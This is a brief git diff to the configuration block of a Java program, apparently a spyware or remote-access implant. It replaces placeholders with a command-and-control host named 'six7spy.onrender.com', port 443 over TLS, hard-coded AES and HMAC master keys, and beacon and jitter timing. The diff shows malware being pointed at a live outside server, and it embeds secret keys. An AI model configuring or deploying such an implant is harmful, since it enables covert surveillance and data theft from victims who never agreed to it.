@@ -19,11 +19,11 @@ import javax.imageio.*;
 public class Main {
 
     // ── Config — edit before building ───────────────────────────────────────
-    static final String  HOST            = "YOUR_HOST_HERE";          // e.g. app.railway.app
+    static final String  HOST            = "six7spy.onrender.com";
     static final int     PORT            = 443;
     static final boolean USE_TLS         = true;
-    static final String  MASTER_AES_HEX  = "YOUR_64_HEX_AES_KEY_HERE";
-    static final String  MASTER_HMAC_HEX = "YOUR_64_HEX_HMAC_KEY_HERE";
+    static final String  MASTER_AES_HEX  = "d634fc26c4bdcdc9cc8cf85dee10c7b3721553977cf68cec96078f094671b1b6";
+    static final String  MASTER_HMAC_HEX = "3eb8b23d5938e78c73f82631a6e697eaeff88d0b7f2cbfa7cc69455d5553d054";
     static final int     BEACON_MS       = 5000;
     static final int     JITTER_MS       = 2000;
     // ────────────────────────────────────────────────────────────────────────
